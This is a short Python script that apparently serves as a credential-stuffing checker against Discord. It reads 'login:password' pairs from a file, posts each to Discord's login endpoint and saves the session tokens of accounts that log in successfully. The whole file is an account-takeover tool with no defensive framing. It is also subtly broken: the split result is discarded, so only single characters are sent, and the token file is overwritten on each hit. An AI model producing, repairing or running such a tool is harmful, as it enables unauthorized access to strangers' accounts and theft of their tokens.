import requests
from colorama import Fore


with open("logins.txt", "r") as f:
  logins = f.read().splitlines()
  for login in logins:
    login.split(":")

    # Send request to login API
    r = requests.post(
      "https://discord.com/api/v9/auth/login", 
      headers = {
        "Content-Type": "application/json"
      }, 
      json = {
        "login": login[0], 
        "password": login[1]
      }
    )

    # Check status code
    if r.status_code == 200:
      # Save token if its valid
      print(f"{Fore.GREEN}[+] {login[0]} - Success")
      with open("tokens.txt", "w") as f:
        f.write(r.json()["token"] + "\n")
    else:
      print(f"{Fore.RED}[-] {login[0]} - Failed")
